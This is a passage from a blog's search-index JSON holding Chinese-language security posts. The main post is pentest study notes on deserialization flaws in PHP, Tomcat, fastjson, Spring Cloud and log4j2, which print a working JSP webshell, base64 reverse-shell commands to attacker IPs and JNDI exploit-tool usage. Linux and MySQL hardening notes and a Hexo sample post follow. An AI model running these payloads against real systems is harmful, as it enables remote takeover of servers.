$_GET[&#x27;test&#x27;];@$unser = unserialize($a);payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n1.thinkphp反序列化\n用户参数可控，在序列化的时候加入了攻击代码，反序列化的时候没有做安全过滤等机制，导致了参数进入服务器并且魔法函数自动调用导致攻击。\n1用户参数（实体对象）----序列化（打包）----&gt;序列化字符串------反序列化（拆包）-----&gt;转为实体对象\n&lt;三&gt;php反序列化魔法函数：\n\n\n\n\n\n\n\n\n\n_construct()：创建对象时自动调用\n_destruct()：销毁对象时自动调用\n\n\n_get()：读取不可访问属性时，被调用\n_toString()：对象被当作字符串时调用\n\n\n_sleep()：对象被序列化前调用\n_wakeup()：对象被序列化后调用\n\n\n_call()：调用不可访问方法时，_call()会被调用\n\n\n\n\n一、中间件反序列化漏洞\n1.==jboss==反序列化\nJBoss 5.x/6.x 反序列化漏洞\n该漏洞利用了 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化 。\nHttpInvoker 是 JBoss（WildFly）提供的一个远程调用（RPC）框架，允许客户端通过 HTTP 协议 调用服务器端的 Java 方法（类似 Java RMI，但基于 HTTP）。其核心特点包括：\n\n基于序列化：通过 Java 对象序列化传输数据\n\nReadOnlyAccessFilter  是 JBoss HttpInvoker 的一个安全过滤器，主要用于：\n\n限制远程调用的权限：确保只有 只读操作（如查询）能被执行，阻止 写操作（如修改配置、执行命令）。\n防御恶意调用：防止攻击者通过 HttpInvoker 接口执行危险操作（如反序列化攻击、未授权访问）。\n\n2.==WebLogic==反序列化\nWebLogic 服务在反序列化数据时未进行安全校验，攻击者可构造恶意序列化数据，WebLogic 自动反序列化数据，执行恶意脚本或命令\nWeblogic 常见漏洞有那些：\n\n弱口令\n反序列化漏洞（CVE-2019-2725 ）\n任意文件上传漏洞操作（CVE-2018-2894）\nSSRF 漏洞（需要安装Weblogic时选择UDDI组件）\n\n3.==tomcat==反序列化\nCVE-2017-12615是Apache Tomcat中的一个高危漏洞\nTomcat运行在Windows操作系统上，并启用了**HTTP PUT请求方法时，攻击者可以通过构造PUT请求，在服务器上任意写入文件。这种漏洞允许攻击者上传JSP文件**到服务器，再使用木马连接工具操控对方服务器\n123456789101112131415161718192021222324252627282930313233PUT /xx.jsp/ HTTP/1.1HOST: *****User-Agent: ******........--------------------------------请求体xx.jsp木马内容，密码passwd-----------------------------&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.getParameter(&quot;passwd&quot;);    if (cls != null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;\n二、框架漏洞反序列化\n&lt;一&gt;  ==JNDI==\nJNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。\n&lt;二&gt;  RMI\nRMI（Remote Method Invocation）远程方法调用，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。\n&lt;三&gt; lookup函数\n如果lookup参数可控的话，那么我们就可以传入恶意的url地址来控制受害者加载攻击者指定的恶意类。当我们指定一个恶意的URL地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在RMI中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个class文件，当然也就不能成功获取到这个对象。\n&lt;四&gt;  ==LADP==\nLDAP是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。\n1.==shiro550==反序列化\nApache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。\n1.原理：\nshiro默认使用了Cookie RememberMe Manager，其处理cookie（值）的流程（反序列化过程）是：\n得到rememberMe（参数）的cookie值 –-&gt; Base64解码 –-&gt; AES解密 –-&gt;反序列化\n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。，最终实现远程代码执行（RCE）\n2.相关知识\n\nCookie 值本身是加密后的数据\nAES硬编码 指在代码或配置中直接明文写入 AES加密算法的密钥（Key）或初始化向量（IV），例如：\n\n123// 硬编码示例（不安全！）String key = &quot;0123456789ABCDEF0123456789ABCDEF&quot;; // 32字节密钥（AES-256）byte[] iv = &quot;1234567890ABCDEF&quot;.getBytes();       // 16字节IV\n这种方式将敏感信息（密钥）直接暴露在源码中，而非通过安全方式（如密钥管理系统、环境变量）动态获取。\n3.判断：\n1.数据返回包中包含 rememberMe=deleteMe 字段。\n2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：**rememberMe=**然后查看返回数据包中是否存在关键字。\n2.==fastjson==反序列化\nfastjson是阿里巴巴的开源JSON解析库，fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。\nJSON字符串中多出了一个@type字段，使用SerializerFeature.WriteClassName  标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，这个就是AutoType，和引入AutoType的原因。\n1.1 原理：\nfastjson在解析json的过程中,支持使用**@type字段来指定反序列化的类型,并调用该类的set/get方法来访问属性,当组件开启了autotype功能**并且反序列化不可信数据时,攻击者可以构造数据,\n使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。\n1.2 指纹特征：\n(1) 根据返回包判断\n任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽！\n(2)利用DNSlog盲打\n构造以下payload，利用dnslog平台接收\n1&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;\n(3) Java站并且传的数据是JSON格式的都可以尝试\n(4) 指纹扫描检测\n1.3 漏洞利用\nFastjson 漏洞依赖特定类的属性和方法，经典利用链包括：\n\nJdbcRowSetImpl + JNDI 注入（CVE-2017-18349、cnvd_2019_22238  ）：\n\nJdbcRowSetImpl 的 setDataSourceName() 方法触发 JNDI 查询。\n结合远程恶意类加载（如 Exploit.class 中定义静态代码块执行命令）。\n\n\n\n示例：\n在公网服务器上JNDI注入：\n12345java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;121.40.162.39&quot;#相关说明：YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==    --base64解码--&gt;bash -i &gt;&amp; /dev/tcp/121.40.162.39/7777 0&gt;&amp;1  #攻击者IP和监听端口，前后一致\n将会生成rmi：\n\n刷新页面抓包，修改请求方式为POST，设置fastjson payload：\n1234567&#123;    &quot;b&quot;:&#123;    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,    &quot;dataSourceName&quot;:&quot;rmi://8.220.194.45:1099/7b2rz4&quot;,    &quot;autoCommit&quot;:true    &#125;&#125;\n再开一个终端，执行监听nc -nvlp 7777；并将修改之后的bp包发送，成功将触发shell反弹：\n\n\n3.==springboot==反序列化（==绿叶==）\n1.原理：\n当Spring Cloud Function 使用functionRouter路径时，HTTP请求头参数存在 SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。\n请求头修改、增加内容：\n12POST /functionRouter HTTP/1.1 #修改内容spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS8yMjIyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)  #需要添加的内容\n2.漏洞利用\n靶场：春秋云镜 CVE-2022-22963\n在kali里用sbscan扫描,发现springboot漏洞：\n# python.exe sbscan.py -u  [ip]\n\n抓包修改：\n\n开启监听，然后发送请求，收到shell反弹：\n\n4.log4j与log4j2的关系\nlog4j 是 Apache 的一个开源日志库，是一个基于 Java 的日志记录框架\nLog4j2 是 log4j 的后继者，其中引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，被应用于业务系统开发，用于记录程序输入输出日志信息\n5.==log4j2==反序列化\n1.原理：\nlog4j2 在日志输出中，未对字符合法性进行严格的限制，攻击者通过构造**$&#123;jndi:ldap:恶意url/poc&#125;恶意日志，在log4j2通过 JNDI 的lookup()**函数解析日志时，就会执行poc.class文件里的代码，实现 JNDI注入，从而造成RCE。\n\n2.漏洞利用\nLog4j2 默认支持 $&#123;jndi:ldap://attacker.com/exp&#125; 这种语法，攻击者可以通过恶意日志消息触发 远程代码执行（RCE）\n使用jndi利用工具执行反弹shell (经过base64) 必须是公网的服务器\n12345bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;18.220.194.45 → 攻击者ip7777 任意端口（后续要监听）java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;8.134.69.71&quot;  \n说明：\n12345678910111213141516171819202122命令解析：bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;1该命令用于创建一个反向Shell连接，将本地Shell会话重定向到远程主机的指定端口。以下是每个字段的详细解释：1. bash -i    bash：调用Bash Shell。    -i：以交互模式（Interactive Mode）启动Shell，允许用户输入命令并接收输出。2. &gt;&amp; /dev/tcp/8.220.194.45/7777    &gt;&amp;：将标准输出（stdout）和标准错误（stderr）重定向到指定目标。    /dev/tcp/8.220.194.45/7777：        /dev/tcp：Bash内置的虚拟设备，支持通过TCP协议进行网络通信。        8.220.194.45：远程主机的IP地址。        7777：远程主机监听的端口号。        作用：将Shell的输出和错误信息发送到远程主机的7777端口。3. 0&gt;&amp;1    0：标准输入（stdin）的文件描述符。    &gt;&amp;1：将标准输入重定向到标准输出（即远程连接）。    作用：将远程主机发送的数据作为本地Shell的输入，实现双向通信。\n再用ssh连接服务器，监听一下端口 我这里是7777\nnc -lvnp 7777\n&lt;五&gt;反序列化防护\n\n应该尽量避免用户输入反序列化的参数\n如果确实需要对不受信任的数据源进行反序列化，需要确保数据未被篡改，比如使用数字签名来检查数据的完整性\n严格控制反序列化相关函数的参数，坚持用户所输入的信息都是不可靠的原则\n做好代码审计相关工作，提高开发人员的安全意识\n\n","slug":"反序列化漏洞","date":"2025-07-18T08:00:00.000Z","categories_index":"漏洞","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"52578dceeb148ed4d1a3fb12873d5ab1","title":"网安基础知识","content":"网安常用知识\n一、Linux安全基础\nLinux 是最常用于服务器的操作系统之一，在网络安全中扮演着重要角色。它的安全性依赖于许多方面，包括文件权限、用户管理、网络配置等。\n1.用户和权限管理\n\n最小权限原则：每个用户只应拥有完成任务所必需的最小权限。通过设置适当的文件权限和用户角色来控制用户对系统资源的访问。\n使用 sudo 管理权限：避免直接使用 root 用户。使用 sudo 命令可以为特定用户分配执行特定命令的权限。\n\n\n配置 /etc/sudoers 文件来管理权限：\n\n\n\n示例：\n12# 例如，允许用户 chunzi 执行所有命令chunzi    ALL=(ALL)       ALL\n设置强密码策略：\n\n\n在 /etc/login.defs 文件中，可以设置密码的长度、复杂度等要求。\n\n\n通过 passwd 命令可以强制用户定期更改密码。\n\n\n使用 pam_cracklib 模块来增强密码复杂性检查。\n\n\n\n\n通常，pam_cracklib 是作为 pam 模块的一部分预安装在大多数 Linux 发行版中的。如果你的系统没有安装，可以使用以下命令来安装它：\n\n\nsudo apt-get install libpam-cracklib  (Debian/ubuntu系统)\nsudo yum install pam_cracklib  (Centos/RHEL系统)\n1234567-  `pam_cracklib` 的配置文件通常位于 `/etc/pam.d` 目录下。你需要编辑与密码相关的 PAM 配置文件，通常是 `/etc/pam.d/common-password`（Debian 系列）或 `/etc/pam.d/system-auth`（RHEL/CentOS 系列）。 - 找到类似于 `password requisite pam_unix.so` 或 `password requisite pam_cracklib.so` 的行，加入或修改如下内容： - ```  password requisite pam_cracklib.so retry=3 minlen=8 difok=3\n\n\n\n\n\n\n用户和组管理：\n\nuseradd、usermod、groupadd 等命令用于管理用户和组。\n使用 chmod、chown、chgrp 等命令管理文件权限。\n\n\n\n\n命令\n功能\n参数选项\n示例\n\n\n\n\nuseradd\n创建新用户\n-m, -d, -s, -G\nsudo useradd -m john\n\n\nusermod\n修改现有用户\n-d, -s, -G, -a\nsudo usermod -s /bin/bash john\n\n\ngroupadd\n创建新组\n-g, -r\nsudo groupadd dev\n\n\nchmod\n更改文件或目录权限\n-R\nchmod 755 file.txt\n\n\nchown\n更改文件或目录的所有者和所属组\n-R\nsudo chown john:dev file.txt\n\n\nchgrp\n更改文件或目录的所属组\n-R\nsudo chgrp dev file.txt\n\n\n\n2. 防火墙配置 (iptables / firewalld)\n\n\n使用 iptables或 firewalld来配置防火墙规则，防止未授权的访问。\n\n\niptables 配置示例：\n\n\niptables -A INPUT -p tcp --dport 22 -j ACCEPT  # 允许 SSH 访问\niptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许 HTTP 访问\niptables -A INPUT -j DROP  # 默认拒绝所有其他输入流量\n123456789101112131415-  配置完成后，使用 `service iptables save` 保存规则。 #### 3. **系统日志和审计**-  **日志管理**：Linux 系统通过 `/var/log` 目录记录所有重要操作和系统事件。`syslog`、`auth.log` 和 `messages` 等日志文件可以提供有价值的信息，帮助审计系统行为   - 使用 `logwatch` 工具定期查看日志文件并自动生成报告。  - 配置 `rsyslog` 进行集中日志管理。#### 4. **SSH 配置**- **禁用 root 用户远程登录**：修改 `/etc/ssh/sshd_config` 文件，禁用 root 登录：```bashPermitRootLogin no\n\n\n\n\n\n\n使用密钥认证：禁用密码认证，只允许使用 SSH 密钥进行登录：\n\n\nPasswordAuthentication no\n12345-  **更改默认端口**：避免使用默认的 22 端口，可以在 `sshd_config` 中修改： - ```bash  Port 2222\n\n\n\n\n二、MySQL 安全基础\nMySQL 是流行的关系型数据库管理系统。保护 MySQL 数据库的安全非常重要，因为它存储了应用程序的关键数据。\n1. 数据库用户和权限管理\n最小权限原则：为每个数据库用户设置最小的访问权限，避免用户拥有过多的权限。\n\n使用 GRANT 命令为用户分配权限：\n\n  1GRANT SELECT, INSERT ON database_name.* TO &#x27;user&#x27;@&#x27;host&#x27;;\n\n通过 REVOKE 命令撤销权限：\n\n  1REVOKE ALL PRIVILEGES ON database_name.* FROM &#x27;user&#x27;@&#x27;host&#x27;;\n\n定期审计用户权限，确保不再需要的用户被删除。\n\n2. 配置 MySQL 密码策略\n\n\n使用 validate_password 插件强制实施密码复杂性要求。你可以通过以下命令启用：\n1INSTALL PLUGIN validate_password SONAME &#x27;validate_password.so&#x27;;\n\n\n配置密码长度、复杂度和过期时间等要求\n\n\n  12SET GLOBAL validate_password.policy=2;  # 设置密码策略SET GLOBAL validate_password.length=12;  # 设置密码最小长度\n3. 加密和数据保护\n\n\n启用 SSL 加密为了确保客户端与服务器之间的通信安全，可以启用 SSL 加密。\n\n生成证书并配置 MySQL 使用 SSL：\n\n1ALTER USER &#x27;user&#x27;@&#x27;host&#x27; REQUIRE SSL;\n\n\n4. 配置 my.cnf 安全选项\n\n\n修改 my.cnf 配置文件，禁用远程 root 登录：\n123[mysqld]skip-networkingbind-address = 127.0.0.1  # 只允许本地访问\n\n\n5. 定期备份\n\n\n配置定期的数据库备份策略，使用 mysqldump 或 xtrabackup 等工具进行备份。\n1mysqldump -u root -p database_name &gt; backup.sql\n\n\n三、Shell 脚本在网络安全中的应用\nShell 脚本在网络安全中通常用于自动化任务，比如日志分析、安全检查、定期备份等。通过编写 Shell 脚本，可以减少人工操作，提升工作效率。\n1. 文件权限审计脚本\n\n\n定期检查敏感文件和目录的权限，确保没有错误的权限设置。\n12345678#!/bin/bashFILES_TO_CHECK=(&quot;/etc/passwd&quot; &quot;/etc/shadow&quot; &quot;/etc/ssh/sshd_config&quot;)for file in &quot;$&#123;FILES_TO_CHECK[@]&#125;&quot;; do    if [ -e &quot;$file&quot; ]; then        echo &quot;Checking permissions for $file&quot;        ls -l $file    fidone\n\n\n2. 定期检查端口开放状态\n\n\n使用 netstat 或 ss 命令检查开放端口，确保没有不必要的端口暴露。\n1234#!/bin/bashOPEN_PORTS=$(netstat -tuln | grep -E &#x27;^tcp|^udp&#x27;)echo &quot;Open Ports:&quot;echo &quot;$OPEN_PORTS&quot;\n\n\n3. 日志分析脚本\n\n\n定期分析 SSH 登录日志，检测暴力破解尝试。\n12345#!/bin/bashLOG_FILE=&quot;/var/log/auth.log&quot;FAILED_LOGINS=$(grep &quot;Failed password&quot; $LOG_FILE)echo &quot;Failed login attempts:&quot;echo &quot;$FAILED_LOGINS&quot;\n\n\n4. 自动化安全更新脚本\n\n\n定期更新系统和软件包，确保漏洞得到及时修复。\n12345#!/bin/bashapt update &amp;&amp; apt upgrade -y  # 对于 Debian/Ubuntu 系统sudo yum check-update      # CentOS 7 或更早版本sudo dnf check-update      # CentOS 8 或更高版本\n\n\n","slug":"网安常用知识","date":"2025-07-16T08:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start\nCreate a new post\n1$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server\n1$ hexo server\nMore info: Server\nGenerate static files\n1$ hexo generate\nMore info: Generating\nDeploy to remote sites\n1$ hexo deploy\nMore info: Deployment\n","slug":"hello-world","date":"2025-07-14T15:11:14.379Z","categories_index":"","tags_index":"","author_index":"归尘aliez"}]